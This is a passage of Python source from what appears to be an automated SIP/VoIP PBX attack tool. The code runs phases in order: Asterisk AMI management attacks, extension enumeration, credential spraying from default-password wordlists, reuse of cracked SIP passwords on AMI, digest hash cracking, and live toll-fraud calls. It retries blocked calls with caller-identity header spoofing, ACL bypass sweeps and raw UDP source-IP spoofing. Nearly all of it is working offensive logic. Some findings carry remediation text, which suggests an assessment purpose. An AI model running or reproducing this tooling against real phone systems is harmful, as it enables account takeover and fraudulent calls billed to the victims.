                {"name": f.name, "severity": f.severity, "target": f.target,
                 "title": f.title, "evidence": f.evidence,
                 "remediation": f.remediation}
                for f in findings
            ]
            if findings:
                for f in findings:
                    _finding(f.severity, f"{f.target} — {f.title}", col)
            else:
                _info("No HTTP admin surfaces found on open TCP ports.", col)
        else:
            _info("No TCP ports open — skipping HTTP probes.", col)

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 2b · CVE / VULNERABILITY SCAN  [{h.ip}]", col)

        # sip_port / sip_tcp / sip_tls may be updated by SIP auto-recovery below;
        # _phase_cve_check reads them from state after any patch.
        _phase_cve_check(state, args, col, sip_port, report_dir, traffic_log)
        # Refresh local aliases in case cve phase updated state.sip
        sip_info      = state.sip or {}
        sip_transport = sip_info.get("transport", "udp")
        sip_tcp       = sip_transport in ("tcp", "tls")
        sip_tls       = sip_transport == "tls"
        sip_port      = state.sip_port
        if not state.cve_findings:
            _info("No CVE/config findings on this host.", col)

        if state.sip:
            sip_srv = state.sip.get("server", "")
            _ok(f"SIP/{sip_transport.upper()}: {state.sip.get('status')} {state.sip.get('reason')}  "
                f"server={col.BOLD}{sip_srv or '(hidden)'}{col.RESET}  "
                f"fingerprint={col.CYAN}{state.fingerprint}{col.RESET}", col)
            if _CVE_AVAILABLE:
                _sip_banner_text = (
                    f"Server: {sip_srv}\n"
                    f"Allow: {', '.join(state.sip.get('allow', []))}\n"
                )
                _banner_intel = cve_module._sip_intel_extract(
                    _sip_banner_text, "SIP-banner"
                )
                _show_sip_intel(_banner_intel, col)
        else:
            _warn(f"{h.ip}: no SIP on standard ports — auto-probing all transports…", col)
            _disc_sip, _disc_port, _disc_tcp, _disc_tls = _sip_no_response_diagnosis(
                h.ip, h.open_ports, args.port, args.timeout, args.source_ip, col
            )
            if _disc_sip:
                # AUTO-RECOVERY: patch state.sip and all local SIP variables so
                # ALL subsequent phases (enum, spray, call PoC) run on the found port
                state.sip      = _disc_sip
                state.sip_port = _disc_port
                state.sip_tcp  = _disc_tcp
                state.sip_tls  = _disc_tls
                sip_info       = _disc_sip
                sip_transport  = _disc_sip.get("transport", "udp")
                sip_tcp        = _disc_tcp
                sip_tls        = _disc_tls
                sip_port       = _disc_port
                _ok(
                    f"AUTO-RECOVERED SIP on {sip_transport.upper()}/{sip_port} "
                    f"— full scan resuming (enum · spray · call PoC)",
                    col,
                )

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 3 · AMI / MANAGEMENT ATTACK  [{h.ip}]", col)

        # _phase_ami_attack populates state.ami, state.ami_http, and
        # IMMEDIATELY injects loot into state.extension_list + state.crack_pool
        # so that Phase 5 (enum) and Phase 6 (spray) start with ground-truth data.
        if args.ami_attack:
            _phase_ami_attack(state, args, col, traffic_log, source_port_range)
            # If AMI originate is wanted, attempt it here (pre-SIP-enum path)
            if (
                state.ami and state.ami.get("success")
                and args.call_test and args.call_to
                and state.call_test is None
            ):
                ami_exts = state.ami.get("extensions") or []
                originate_from = args.call_from or (ami_exts[0] if ami_exts else "1000")
                _info(
                    f"AMI originate PoC: {col.BOLD}{originate_from}{col.RESET} → "
                    f"{col.BOLD}{args.call_to}{col.RESET}",
                    col,
                )
                _jitter_sleep(args.jitter)
                try:
                    originate_result = ami.originate_call(
                        h.ip,
                        port=args.ami_port,
                        username=state.ami["username"],
                        password=state.ami["password"],
                        call_from=originate_from,
                        call_to=args.call_to,
                        timeout=args.timeout,
                        dry_run=args.call_dry_run,
                    )
                    if originate_result and getattr(originate_result, "success", False):
                        _finding(
                            "critical",
                            f"AMI ORIGINATE toll fraud confirmed — call to "
                            f"{args.call_to} placed via AMI",
                            col,
                        )
                        state.call_test = {
                            "call_to": args.call_to,
                            "call_from": originate_from,
                            "success": True,
                            "reached_dialplan": True,
                            "status_code": "AMI",
                            "reason": "Originate via AMI",
                            "evidence": getattr(originate_result, "evidence", ""),
                            "trace": "",
                            "srtp_state": "off",
                            "dtmf_digits_sent": "",
                        }
                    else:
                        _info("AMI originate: call not confirmed (may need dialplan check).", col)
                except AttributeError:
                    _info("ami.originate_call() not available in this build — skipping.", col)

        # ══════════════════════════════════════════════════════════════════
        # NOTE: Phase ordering — ENUM (5) and SPRAY (6) now run BEFORE
        # the call test so that CONFIRMED_CREDS is fully populated when
        # INVITE is sent.  The call PoC header is kept here for phase
        # numbering continuity; the actual call block is executed after
        # Phase 6 (see further below).
        # ══════════════════════════════════════════════════════════════════

        if not state.sip:
            _warn(
                f"{h.ip}: all SIP transports exhausted — no reachable SIP port found.\n"
                f"         Extension enumeration, credential spray, and call PoC cannot run.\n"
                f"         Check recommendations in Phase 2b above for bypass paths.",
                col,
            )
            host_reports.append(state.to_host_report())
            continue

        # --auto with no --call-to but creds found: hint the operator
        if args.auto and not args.call_to and state.credentials_found:
            _warn("  [!] Add --call-to <YOUR_NUMBER> to demonstrate live toll fraud", col)

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 5 · EXTENSION ENUMERATION  [{h.ip}]", col)
        # (Moved before call test so confirmed creds feed into INVITE)
        # ══════════════════════════════════════════════════════════════════

        ami_dumped_exts: list[str] = (state.ami or {}).get("extensions") or []

        if args.auto and not args.ext_range and not ami_dumped_exts:
            auto_ranges = enumeration.ranges_for_fingerprint(state.fingerprint)
            _info(
                f"AUTO mode: using platform-specific ranges for {state.fingerprint}: {auto_ranges}",
                col,
            )

        if args.enum:
            if ami_dumped_exts:
                ext_list = ami_dumped_exts
                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
                _jitter_sleep(args.jitter)
                found = enumeration.sweep(
                    h.ip, ext_list, port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    header_ip=_spoof_header_ip,
                    extra_headers=_base_extra_headers or None,
                )
            elif args.ext_range:
                ext_list = enumeration.expand_ext_range(args.ext_range)
                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
                prog = Progress("REGISTER sweep", len(ext_list), col)
                _jitter_sleep(args.jitter)
                found = enumeration.sweep(
                    h.ip, ext_list, port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log, progress_cb=prog.tick,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
                prog.close()
            else:
                if args.full:
                    ranges = enumeration.ranges_for_fingerprint(state.fingerprint)
                    found_all: list[enumeration.ExtensionResult] = []
                    seen_exts: set[str] = set()

                    specials = enumeration.SPECIAL_EXTENSIONS[:]
                    _jitter_sleep(args.jitter)
                    sf = enumeration.sweep(
                        h.ip, specials, port=sip_port,
                        timeout=args.timeout, max_workers=args.workers,
                        traffic_log=traffic_log,
                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    )
                    for r in sf:
                        if r.extension not in seen_exts:
                            seen_exts.add(r.extension)
                            found_all.append(r)
                    if sf:
                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)

                    prio_path = os.path.join(
                        os.path.dirname(__file__), "wordlists", "extensions_priority.txt"
                    )
                    if os.path.exists(prio_path):
                        with open(prio_path) as _pf:
                            prio_list = [
                                ln.strip() for ln in _pf
                                if ln.strip() and not ln.startswith("#")
                                and ln.strip() not in seen_exts
                            ]
                        _info(f"Priority sweep: {len(prio_list)} common extensions...", col)
                        prog = Progress("Priority sweep", len(prio_list), col)
                        _jitter_sleep(args.jitter)
                        pf = enumeration.sweep(
                            h.ip, prio_list, port=sip_port,
                            timeout=args.timeout, max_workers=args.workers,
                            traffic_log=traffic_log, progress_cb=prog.tick,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                        )
                        prog.close()
                        for r in pf:
                            if r.extension not in seen_exts:
                                seen_exts.add(r.extension)
                                found_all.append(r)
                        if pf:
                            _ok(f"Priority hits: {[r.extension for r in pf]}", col)

                    _info(f"Fingerprint: {state.fingerprint} — adaptive sweep "
                          f"over ranges {ranges} (filling gaps)...", col)
                    for (lo, hi) in ranges:
                        total_coarse = (hi - lo) // 10 + 1
                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
                        _jitter_sleep(args.jitter)
                        batch = enumeration.adaptive_sweep(
                            h.ip, port=sip_port, low=lo, high=hi,
                            timeout=args.timeout, max_workers=args.workers,
                            traffic_log=traffic_log, progress_cb=prog.tick,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                        )
                        prog.close()
                        for r in batch:
                            if r.extension not in seen_exts:
                                seen_exts.add(r.extension)
                                found_all.append(r)
                    found = found_all
                else:
                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
                    prog = Progress("REGISTER sweep", len(ext_list), col)
                    _jitter_sleep(args.jitter)
                    found = enumeration.sweep(
                        h.ip, ext_list, port=sip_port,
                        timeout=args.timeout, max_workers=args.workers,
                        traffic_log=traffic_log, progress_cb=prog.tick,
                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    )
                    prog.close()

            if found:
                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
                prog2 = Progress("INVITE probe", len(found), col)
                _jitter_sleep(args.jitter)
                inv_map = enumeration.probe_invite_acceptance(
                    h.ip, [r.extension for r in found], port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log, progress_cb=prog2.tick,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
                prog2.close()
                for r in found:
                    inv = inv_map.get(r.extension)
                    if inv:
                        r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
                        r.auth_required    = r.auth_required and inv.auth_required

            # Merge sweep results into state.extension_list (deduped)
            for r in found:
                existing_exts = {e["extension"] for e in state.extension_list}
                if r.extension not in existing_exts:
                    state.extension_list.append(asdict(r))
                else:
                    # Update existing entry with richer data from sweep
                    for entry in state.extension_list:
                        if entry["extension"] == r.extension:
                            entry.update(asdict(r))
                            break

            anon = sum(1 for x in found if x.anonymous_invite)
            open_reg = sum(1 for x in found if x.open_register)
            _ok(f"{len(found)} extension(s) found — "
                f"auth_required:{len(found)-anon}  "
                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
                col)

        # ── Phase 5 → spray adaptive injection (fallback) ─────────────────
        # If enum found nothing but AMI dumped extensions, they were already
        # added in _phase_ami_attack(); ensure the list is not empty for spray.
        if not state.extension_list and ami_dumped_exts:
            _info(
                f"Adaptive: injecting {len(ami_dumped_exts)} AMI-dumped extension(s) "
                f"into EXTENSION_LIST (enum skipped or found nothing).",
                col,
            )
            state.add_extensions(ami_dumped_exts, source="ami_dump")

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 6 · CREDENTIAL SPRAY  [{h.ip}]", col)
        # ══════════════════════════════════════════════════════════════════

        # Auth-bypass CVE: if confirmed, run spray even with no extensions
        # by injecting a synthetic probe list of common extension numbers.
        if state.cve_auth_bypass_triggered and not state.extension_list:
            _warn(
                "[ADAPTIVE] Auth-bypass CVE confirmed with no enumerated extensions — "
                "injecting synthetic probe list (1000–1010, 100–110) for spray",
                col,
            )
            state.add_extensions(
                [str(n) for n in list(range(1000, 1011)) + list(range(100, 111))],
                source="synthetic",
            )

        if args.spray and state.extension_list:
            # Build ordered credential list:
            #   1. top_defaults.txt  (~60 entries, fastest wins — always tried first)
            #   2. full credentials.txt  (only in --full/--auto or --cred-file override)
            _top_path = os.path.join(os.path.dirname(__file__), "wordlists", "top_defaults.txt")
            _full_path = args.cred_file
            _use_full = args.full or getattr(args, "auto", False) or (
                args.cred_file != os.path.join(os.path.dirname(__file__), "wordlists", "credentials.txt")
            )
            if os.path.exists(_top_path):
                _top_creds = list(auth.load_credentials(_top_path))
            else:
                _top_creds = []
            if _use_full:
                if not os.path.exists(_full_path):
                    _warn(f"Credential file not found: {_full_path} — using top_defaults only", col)
                    _full_creds = []
                else:
                    _full_creds = list(auth.load_credentials(_full_path))
                # Dedup: skip full-list pairs already in top list
                _top_set = {(u, p) for u, p in _top_creds}
                _full_creds = [(u, p) for u, p in _full_creds if (u, p) not in _top_set]
                creds: list[tuple[str, str]] = _top_creds + _full_creds
            else:
                creds = _top_creds
                _info(
                    f"Fast spray: using top_defaults.txt ({len(creds)} pairs). "
                    f"Add --spray --full for complete {os.path.basename(_full_path)} wordlist.",
                    col,
                )
            if args.grandstream_creds or state.fingerprint == "Grandstream":
                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
                if os.path.exists(gs_path):
                    creds = creds + list(auth.load_credentials(gs_path))

            targets_for_spray = state.spray_targets() if creds else []
            if not creds:
                _warn("No credentials loaded — skipping spray (top_defaults.txt missing?)", col)
            if targets_for_spray and creds:
                _spray_workers = args.workers
                total_attempts = len(creds) * len(targets_for_spray)
                _info(
                    f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
                    f"extension(s) = {total_attempts} attempts "
                    f"(workers={_spray_workers}  max-failures={args.max_failures_per_ext}) "
                    f"crack_pool_size={len(state.crack_pool)}",
                    col,
                )
                if state.crack_pool:
                    _info(
                        f"  [ADAPTIVE] {len(state.crack_pool)} pre-cracked password(s) in "
                        f"CRACK_POOL — promoted to front of spray queue",
                        col,
                    )
                prog = Progress("Spray", len(targets_for_spray), col)
                _jitter_sleep(args.jitter)
                hits_spray = auth.spray(
                    h.ip, targets_for_spray, creds,
                    port=sip_port, timeout=args.timeout,
                    max_workers=_spray_workers,
                    max_failures_per_ext=args.max_failures_per_ext,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    ami_cracked_passwords=state.crack_pool,
                    hash_log_path=os.path.join(report_dir, "sip_hashes.txt"),
                )
                prog.close()
                successes = [asdict(c) for c in hits_spray if c.success]
                state.credentials_found = successes
                for ext_hit in successes:
                    state.confirmed_exts.add(ext_hit["extension"])
                if successes:
                    for c in successes:
                        _finding(
                            "critical",
                            f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
                            f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
                            col,
                        )
                else:
                    _info("No credentials cracked via REGISTER spray.", col)

                # Credential reuse: SIP password → AMI
                if successes and state.ami and not state.ami.get("success"):
                    _sip_passwords = list({c["password"] for c in successes if c.get("password")})
                    if _sip_passwords:
                        _info(f"Credential reuse: trying {len(_sip_passwords)} cracked SIP "
                              f"password(s) against AMI...", col)
                        for _pwd in _sip_passwords[:5]:
                            for _user in ["admin", "asterisk",
                                          successes[0].get("username", "admin")]:
                                _reuse = ami.try_login(
                                    h.ip, _user, _pwd,
                                    port=args.ami_port, timeout=args.timeout,
                                )
                                if _reuse and _reuse.get("success"):
                                    _warn(
                                        f"AMI credential reuse: SIP password '{_pwd}' "
                                        f"works on AMI as '{_user}'!",
                                        col,
                                    )
                                    state.ami["reuse_hit"] = {"username": _user, "password": _pwd}
                                    _finding(
                                        "critical",
                                        f"CREDENTIAL REUSE: SIP password '{_pwd}' grants "
                                        f"AMI access as '{_user}' — full PBX control",
                                        col,
                                    )
                                    break

                # INVITE-based spray fallback (some PBXes skip REGISTER challenge)
                if args.auto and not successes:
                    invite_auth_exts = state.spray_targets()
                    if invite_auth_exts:
                        _info(
                            f"AUTO mode: INVITE-based auth spray on "
                            f"{len(invite_auth_exts)} extension(s)...",
                            col,
                        )
                        _jitter_sleep(args.jitter)
                        invite_hits = auth.spray(
                            h.ip, invite_auth_exts, creds,
                            port=sip_port, timeout=args.timeout,
                            max_workers=args.workers,
                            max_failures_per_ext=args.max_failures_per_ext,
                            traffic_log=traffic_log,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                            method="INVITE",
                            hash_log_path=os.path.join(report_dir, "sip_hashes.txt"),
                        )
                        invite_successes = [asdict(c) for c in invite_hits if c.success]
                        if invite_successes:
                            state.credentials_found.extend(invite_successes)
                            for ext_hit in invite_successes:
                                state.confirmed_exts.add(ext_hit["extension"])
                            for c in invite_successes:
                                _finding(
                                    "critical",
                                    f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
                                    f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
                                    col,
                                )
            else:
                _info("No auth-required extensions to spray.", col)
        elif args.spray:
            _info("No extensions in EXTENSION_LIST — skipping credential spray.", col)

        # ══════════════════════════════════════════════════════════════════
        # PHASE 6b · HASH CRACK + RE-SPRAY
        # Post-spray: crack any SIP Digest hashes collected during spray,
        # extend CRACK_POOL, re-spray uncracked extensions with new passwords.
        # ══════════════════════════════════════════════════════════════════

        if args.spray and _CRACK_AVAILABLE:
            _phase(f"PHASE 6b · HASH CRACK + RE-SPRAY  [{h.ip}]", col)
            _phase_crack_hashes_and_respray(
                state, args, col, sip_port, report_dir, traffic_log, source_port_range,
            )

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 4 · TOLL-FRAUD CALL POC  [{h.ip}]", col)
        # (Runs AFTER enum + spray so CONFIRMED_CREDS is fully populated)
        # ══════════════════════════════════════════════════════════════════

        if args.call_test:
            call_from = args.call_from
            username = password = None

            # Build ordered candidate list:
            #   1. CONFIRMED_CREDS from spray (highest confidence — authenticated)
            #   2. anonymous_invite / open_register extensions
            #   3. anonymous probe (no creds at all — most dangerous misconfiguration)
            _call_candidates: list[tuple[str, str | None, str | None]] = []
            for _c in state.credentials_found:
                _call_candidates.append((_c["extension"], _c["username"], _c["password"]))
            if state.extension_list:
                _openish = [
                    e for e in state.extension_list
                    if e.get("anonymous_invite") or e.get("open_register")
                ]
                for _e in _openish:
                    _call_candidates.append((_e["extension"], None, None))
                if _openish and args.auto:
                    _info("AUTO mode: anonymous INVITE accepted — toll-fraud vector confirmed.", col)

            _anonymous_dialout_probe = False
            if _call_candidates:
                _best = _call_candidates[0]
                call_from = call_from or _best[0]
                username, password = _best[1], _best[2]
                _auth_label = f"{username}/{password}" if username else "anonymous"
                _info(f"Primary calling extension: {col.BOLD}{call_from}{col.RESET}  [{_auth_label}]", col)
            else:
                # No discovered or cracked extensions — probe for anonymous dial-out:
                # does the PBX route PSTN calls from a completely unknown, unauthenticated
                # SIP endpoint? This is the most dangerous misconfiguration possible.
                call_from = call_from or "1000"
                _anonymous_dialout_probe = True
                _warn(
                    f"{col.RED}ANONYMOUS DIAL-OUT PROBE{col.RESET}: no extensions found/cracked — "
                    f"testing whether PBX routes PSTN calls from a completely unknown, "
                    f"unauthenticated SIP endpoint (ext {col.BOLD}{call_from}{col.RESET}, no credentials)",
                    col,
                )

            # --call-to-auto: override call_from with first AMI-discovered extension
            if args.call_to_auto:
                ami_exts_for_auto = (state.ami or {}).get("extensions") or []
                if ami_exts_for_auto:
                    auto_from = ami_exts_for_auto[0]
                    _info(
                        f"--call-to-auto: using AMI-discovered extension "
                        f"{col.BOLD}{auto_from}{col.RESET} as from-number for dialplan routing test.",
                        col,
                    )
                    call_from = auto_from
                else:
                    _warn("--call-to-auto: no AMI-discovered extensions available; using default.", col)

            # Dial-plan prefix discovery — tries every candidate extension until a
            # prefix is found; in --auto mode also maps ALL working prefixes exhaustively
            effective_call_to = args.call_to
            all_working_prefixes: list[tuple[str, str, str]] = []  # (prefix, dest, from_ext)

            if args.discover_prefix:
                _platform_prefixes = call.prefixes_for_fingerprint(h.fingerprint)
                _info(
                    f"Prefix discovery: probing {len(_platform_prefixes)} prefixes "
                    f"({h.fingerprint} order) across "
                    f"{min(len(_call_candidates) or 1, 3)} extension(s)...",
                    col,
                )

                _found_prefix: str | None = None
                _probe_exts = _call_candidates[:3] if _call_candidates else [(call_from, username, password)]

                def _prefix_probe_cb(pfx: str, dest: str, r: "call.CallResult") -> None:
                    """Print SIP trace + mini-result for every prefix probe."""
                    _pfx_show = repr(pfx) if pfx else "'(direct)'"
                    _code = r.status_code or "T/O"
                    _hit = r.reached_dialplan
                    _sym = "✓" if _hit else "✗"
                    _info(
                        f"  prefix {_pfx_show:<10} → {dest:<28}  "
                        f"[{_code}]  {'DIALPLAN HIT' if _hit else 'rejected'}  {_sym}",
                        col,
                    )
                    if r.sip_trace:
                        for _tl in r.sip_trace:
                            _info(f"    {_tl}", col)

                for _ext, _uname, _pwd in _probe_exts:
                    _jitter_sleep(args.jitter)

                    if args.auto:
                        # Exhaustive: find every working prefix from this extension
                        _hits = call.discover_all_prefixes(
                            h.ip, args.call_to, _ext,
                            port=args.port, username=_uname, password=_pwd,
                            timeout=args.timeout, traffic_log=traffic_log,
                            source_ip=args.source_ip,
                            source_port_range=source_port_range,
                            prefixes=_platform_prefixes,
                            probe_callback=_prefix_probe_cb,
                        )
                        for _pfx, _dest in _hits:
                            all_working_prefixes.append((_pfx, _dest, _ext))
                        if _hits and _found_prefix is None:
                            _found_prefix, effective_call_to = _hits[0]
                            call_from, username, password = _ext, _uname, _pwd
                    else:
                        # Fast: stop at first working prefix (print trace for each)
                        _found_prefix, effective_call_to = call.discover_dialplan_prefix(
                            h.ip, args.call_to, _ext,
                            port=args.port, username=_uname, password=_pwd,
                            timeout=args.timeout, traffic_log=traffic_log,
                            source_ip=args.source_ip,
                            source_port_range=source_port_range,
                            prefixes=_platform_prefixes,
                            probe_callback=_prefix_probe_cb,
                        )
                        if _found_prefix is not None:
                            call_from, username, password = _ext, _uname, _pwd
                            break

                if _found_prefix is not None:
                    _prefix_label = repr(_found_prefix) if _found_prefix else "'(none — direct E.164 routing)'"
                    _ok(f"Dial-plan prefix: {_prefix_label} → {col.BOLD}{effective_call_to}{col.RESET}  "
                        f"via ext {call_from}", col)
                else:
                    _warn(f"No prefix produced a provisional response — using bare {effective_call_to}", col)

                if len(all_working_prefixes) > 1:
                    _info(f"All working prefixes ({len(all_working_prefixes)} found):", col)
                    for _pfx, _dest, _fext in all_working_prefixes:
                        _pfx_disp = repr(_pfx) if _pfx else "'(direct)'"
                        _ok(f"  prefix {_pfx_disp:<12} → {_dest}  from {_fext}", col)
                    _finding("high",
                             f"Multiple outbound prefixes accepted — dialplan not restricted "
                             f"({len(all_working_prefixes)} routes: "
                             f"{', '.join(repr(p) for p, _, _ in all_working_prefixes)})",
                             col)

            # Non-dry-run: enforce minimum 60s hold so the destination phone
            # rings long enough to be observed — immediate BYE is invisible.
            _poc_duration = 0.0 if args.call_dry_run else max(60.0, args.call_duration)
            _mode_label = "DRY-RUN (CANCEL after provisional)" if args.call_dry_run else f"LIVE ({_poc_duration:.0f}s hold)"
            _info(f"Placing PoC call: {col.BOLD}{call_from}{col.RESET} → "
                  f"{col.BOLD}{effective_call_to}{col.RESET}  "
                  f"mode={_mode_label}  srtp={args.srtp}", col)

            # ── Adaptive self-healing call loop ──────────────────────────────
            # Try progressively corrected configurations until the call succeeds
            # or all remediation strategies are exhausted.
            _jitter_sleep(args.jitter)

            def _try_call(label: str, **overrides) -> "call.CallResult":
                _kw = dict(
                    port=args.port,
                    username=username, password=password,
                    timeout=args.timeout, dry_run=args.call_dry_run,
                    call_duration=_poc_duration,
                    traffic_log=traffic_log,
                    pai=args.pai, diversion=args.diversion,
                    privacy=args.privacy, remote_party_id=args.remote_party_id,
                    from_display=args.from_display,
                    source_ip=args.source_ip,
                    source_port_range=source_port_range,
                    srtp=args.srtp,
                    dtmf_digits=args.call_dtmf or "",
                    header_ip=_spoof_header_ip,
                    extra_headers=_base_extra_headers or None,
                )
                _kw.update(overrides)
                _hdr_disp = _kw.get('header_ip') or ''
                _info(f"  {col.BOLD}[ATTEMPT]{col.RESET} {label}  "
                      f"source={_kw['source_ip'] or '(auto)'}  "
                      f"{'hdr-ip=' + _hdr_disp + '  ' if _hdr_disp else ''}"
                      f"transport={'TCP' if _kw.get('tcp') else 'UDP'}  "
                      f"port={_kw['port']}", col)
                _r = call.place_call(h.ip, effective_call_to, call_from, **_kw)
                _sym = (f"{col.GREEN}✓{col.RESET}" if _r.success else
                        f"{col.YELLOW}~{col.RESET}" if _r.reached_dialplan else
                        f"{col.RED}✗{col.RESET}")
                _code = _r.status_code or "T/O"
                _info(f"  {_sym} Result: [{_code}] {_r.reason or 'timeout'}  "
                      f"dialplan={'YES' if _r.reached_dialplan else 'NO'}  "
                      f"confirmed={'YES' if _r.call_confirmed else 'NO'}", col)
                return _r

            _attempts: list[tuple[str, "call.CallResult"]] = []

            # ── Attempt 1: Best-effort with current config ─────────────────
            result = _try_call("Initial attempt (current config)")
            _attempts.append(("initial", result))

            # ── Auto-fix decision tree ─────────────────────────────────────
            if not result.success and not result.reached_dialplan:
                code = result.status_code

                # A) Timeout + NAT suspected → retry with STUN public IP
                # On-the-fly STUN if not already resolved
                _stun_for_fix = _stun_public_ip
                if code is None and result.nat_suspected and not _stun_for_fix:
                    _info(f"  {col.YELLOW}AUTO-FIX A0:{col.RESET} NAT detected + no --stun — "
                          f"auto-running STUN to resolve public IP…", col)
                    _stun_for_fix = _nat_auto_recover(
                        h.ip, result.local_ip_used or args.source_ip,
                        args.timeout, col,
                    ) or _stun_public_ip
                if code is None and result.nat_suspected and _stun_for_fix and \
                        _stun_for_fix != args.source_ip:
                    _info(f"  {col.YELLOW}AUTO-FIX A:{col.RESET} NAT detected — retrying with "
                          f"STUN public IP {_stun_for_fix}", col)
                    result = _try_call("NAT fix: STUN public IP as Contact/Via",
                                       source_ip=_stun_for_fix)
                    _attempts.append(("nat-fix-stun", result))

                # B) Still timing out → try TCP transport
                if not result.success and not result.reached_dialplan and \
                        result.status_code is None:
                    _info(f"  {col.YELLOW}AUTO-FIX B:{col.RESET} UDP timeout — retrying via "
                          f"TCP transport (bypasses some firewalls)", col)
                    _tcp_src = _stun_public_ip or args.source_ip
                    result = _try_call("TCP transport fallback",
                                       source_ip=_tcp_src, tcp=True,
                                       timeout=max(args.timeout, 8.0))
                    _attempts.append(("tcp-fallback", result))

                # C) Try alternate SIP port 5080 (some PBX systems)
                if not result.success and not result.reached_dialplan and \
                        result.status_code is None and args.port == 5060:
                    _info(f"  {col.YELLOW}AUTO-FIX C:{col.RESET} Trying SIP port 5080 "
                          f"(common alternate PBX port)", col)
                    result = _try_call("Alt port 5080 (some Asterisk configs)",
                                       port=5080, source_ip=_stun_public_ip or args.source_ip)
                    _attempts.append(("alt-port-5080", result))

                # D) 403 Forbidden → try with Anonymous/From-header spoofing
                if result.status_code == 403:
                    _info(f"  {col.YELLOW}AUTO-FIX D:{col.RESET} 403 Forbidden — retrying with "
                          f"Anonymous identity spoof (bypass CLI-based ACL)", col)
                    result = _try_call(
                        "Identity spoof: Anonymous From + P-Asserted-Identity",
                        from_display="Anonymous",
                        pai=f"sip:anonymous@{h.ip}",
                        privacy="id;header;session",
                        source_ip=_stun_public_ip or args.source_ip,
                    )
                    _attempts.append(("403-identity-spoof", result))

                # D2) Still 403 + --auto-spoof → run full IP bypass strategy sweep
                if result.status_code == 403 and _auto_spoof:
                    _info(f"  {col.YELLOW}AUTO-FIX D2:{col.RESET} 403 persists — running IP "
                          f"bypass strategy sweep (header spoof + XFF + UA impersonation)",
                          col)
                    from scanner.spoof import build_bypass_attempts, raw_udp_spoof
                    _real_local = args.source_ip or result.local_ip_used or ""
                    _pbx_via = None
                    if hasattr(result, 'sip_trace') and result.sip_trace:
                        for _tline in result.sip_trace:
                            if _tline.startswith("Via:") or _tline.startswith("via:"):
                                import re as _re_spoof
                                _vm = _re_spoof.search(r'[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}', _tline)
                                if _vm:
                                    _pbx_via = _vm.group(0)
                                break
                    _bypass_attempts = build_bypass_attempts(
                        h.ip, _real_local, pbx_via_ip=_pbx_via,
                        include_raw=bool(_raw_spoof_src),
                    )
                    for _ba in _bypass_attempts:
                        if _ba.strategy == "raw_spoof" and _ba.raw_spoof_src:
                            from scanner import sip as _spoof_sip
                            from scanner.utils import rand_call_id, rand_tag, rand_branch
                            _raw_msg = _spoof_sip.build_message(
                                "INVITE",
                                f"sip:{effective_call_to}@{h.ip}",
                                from_user=call_from, to_user=effective_call_to,
                                host=h.ip, port=args.port,
                                local_ip=_ba.raw_spoof_src,
                                local_port=5060,
                                call_id=rand_call_id(),
                                cseq=1, from_tag=rand_tag(),
                                transport="UDP",
                            )
                            _ok, _diag = raw_udp_spoof(
                                _ba.raw_spoof_src, h.ip, args.port, _raw_msg
                            )
                            _sym = f"{col.GREEN}✓{col.RESET}" if _ok else f"{col.RED}✗{col.RESET}"
                            _info(f"  {_sym} {_ba.description}: {_diag}", col)
                            if _ok:
                                _finding("medium",
                                         f"Raw UDP IP spoof accepted by PBX "
                                         f"(source {_ba.raw_spoof_src} → {h.ip}) — "
                                         f"no IP-layer ACL enforced", col)
                            continue
                        _r_bypass = _try_call(
                            f"IP bypass: {_ba.strategy}",
                            header_ip=_ba.header_ip,
                            extra_headers=(_base_extra_headers or []) + (_ba.extra_headers or []) or None,
                            user_agent=_ba.user_agent,
                            source_port_range=((_ba.source_port, _ba.source_port)
                                               if _ba.source_port else source_port_range),
                        )
                        _attempts.append((f"spoof-{_ba.strategy}", _r_bypass))
                        if _r_bypass.status_code != 403 and (
                                _r_bypass.success or _r_bypass.reached_dialplan
                                or (_r_bypass.status_code and _r_bypass.status_code != 403)):
                            result = _r_bypass
                            _ok_msg = f"IP bypass succeeded: {_ba.description}"
                            _info(f"  {col.GREEN}BYPASS HIT:{col.RESET} {_ok_msg}", col)
                            _finding("critical",
                                     f"PBX ACL bypassed via SIP header spoofing — "
                                     f"strategy: {_ba.strategy} ({_ba.description})",
                                     col)
                            break

                # E) 404 Not Found → run prefix discovery and retry with found prefix
                if result.status_code == 404 and not args.discover_prefix:
